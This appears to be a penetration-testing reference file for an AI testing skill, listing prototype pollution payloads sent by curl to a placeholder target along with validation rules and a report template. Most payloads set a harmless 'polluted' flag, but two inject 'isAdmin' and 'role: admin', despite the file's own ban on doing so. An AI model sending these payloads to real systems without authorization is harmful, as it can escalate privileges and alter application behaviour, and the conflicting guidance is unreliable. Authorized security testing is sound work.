# Prototype Pollution Payload

> ⚠️ **Security Boundary Statement**
>
> This document is for **authorized penetration testing reference** only, helping identify prototype pollution vulnerability risk characteristics.
>
> - All payloads are **technical principle demonstrations**, actual property pollution is prohibited
> - Prototype pollution payloads are for understanding attack surface only, **no application behavior modification**
> - Validation proves vulnerability existence (property inherited), **no RCE or XSS exploitation**
> - See `SKILL.md` for specific execution boundaries
>
> **Core Principle**: Prove existence, do not enable harm

---

## Source: PortSwigger, PayloadsAllTheThings

## Manual Testing

**Note: Test with harmless property names, do not overwrite critical properties**

---

## Validation Objectives (Within Security Boundary)

Prototype pollution validation core objective is **proving existence**:

| Validation Content | Default | Requires Additional Authorization | Prohibited Operations |
|----------|---------|-----------|----------|
| __proto__ Injection | ✓ Test `__proto__` property pollution | - | Modify application behavior |
| constructor.prototype | ✓ Test constructor prototype chain | - | RCE via polluted properties |
| JSON Merge Pollution | ✓ Test deep merge with `__proto__` | - | XSS via polluted template settings |
| Property Inheritance | ✓ Verify polluted property on new objects | - | Denial of service |

**Safe Validation Method**: Inject a harmless custom property (e.g., `__proto__.polluted=true`) and verify inheritance on new objects; do not overwrite security-critical properties.

---

## Detection Methods

### Basic __proto__ Pollution

```bash
# Test via JSON body
curl -s -X POST "https://target.com/api/endpoint" \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"polluted": true}}'

# Verify pollution: create new object and check
# In Node.js context: ({}).polluted === true
```

### URL Parameter Pollution

```bash
# Test via query parameters
curl -s "https://target.com/api/endpoint?__proto__[polluted]=true"

# Test via nested JSON in query
curl -s 'https://target.com/api/endpoint?data={"__proto__":{"polluted":true}}'
```

### constructor.prototype Pollution

```bash
# Alternative prototype chain injection
curl -s -X POST "https://target.com/api/endpoint" \
  -H "Content-Type: application/json" \
  -d '{"constructor": {"prototype": {"polluted": true}}}'
```

### JSON Merge Patch

```bash
# Test via PATCH with merge
curl -s -X PATCH "https://target.com/api/resource/1" \
  -H "Content-Type: application/merge-patch+json" \
  -d '{"__proto__": {"isAdmin": true}}'
```

### Nested Object Pollution

```bash
# Deep nested pollution
curl -s -X POST "https://target.com/api/endpoint" \
  -H "Content-Type: application/json" \
  -d '{"user": {"__proto__": {"role": "admin"}}}'

# Via array
curl -s -X POST "https://target.com/api/endpoint" \
  -H "Content-Type: application/json" \
  -d '[{"__proto__": {"polluted": true}}]'
```

### Detection Indicators

```bash
# Server-side pollution indicators:
# 1. New objects inherit injected property
# 2. Application behavior changes after pollution
# 3. Error messages reference polluted property
# 4. Response includes properties not in original object

# Client-side detection:
# 1. Open browser console
# 2. Check: console.log({}.polluted)
# 3. If true: pollution confirmed
```

---

## Analysis Process

1. Identify endpoints that accept JSON input
2. Test `__proto__` injection with harmless property
3. Test `constructor.prototype` injection
4. Test via different content types (JSON, form, query)
5. Verify property inheritance on new objects
6. **Stop validation**, document pollution point
7. Do not overwrite security-critical properties

---

## Severity Classification

| Pollution Type | Default Severity | Reason |
|----------------|------------------|--------|
| Server-side with RCE potential | Critical | Enables remote code execution |
| Server-side with XSS potential | High | Enables cross-site scripting |
| Client-side pollution | Medium | Requires user interaction |
| Limited property inheritance | Low | No direct exploitation path |
| Blocked by framework | Info | Not exploitable |

---

## Output

```markdown
## Vulnerability: Prototype Pollution

### Location
{URL} - Endpoint: {endpoint}

### Pollution Vector
{__proto__ / constructor.prototype / JSON Merge}

### Evidence
- Payload: {pollution payload}
- Verification: {how inheritance was confirmed}
- Affected properties: {what was polluted}

### Validation Result
- Pollution confirmed: {yes/no}
- Vector: {injection method}
- Impact: {RCE / XSS / behavior modification potential}

### Risk Level
{Medium} - Prototype pollution confirmed, no RCE exploitation
```

---

## Prohibited Operations Checklist

| Prohibited | Description |
|------|------|
| ❌ Overwrite security properties | Do not pollute `isAdmin`, `role`, `permissions` |
| ❌ Achieve RCE | Do not pollute properties used in `eval()` or `exec()` |
| ❌ Inject XSS | Do not pollute template/settings for script injection |
| ❌ Cause denial of service | Do not pollute properties that crash the application |

---

## Execution Boundary Reference

Complete security boundary:
- `SKILL.md` -> Core Principles -> "Prove existence, do not enable harm"
- `templates/severity-classification.md` -> Prototype pollution severity rules
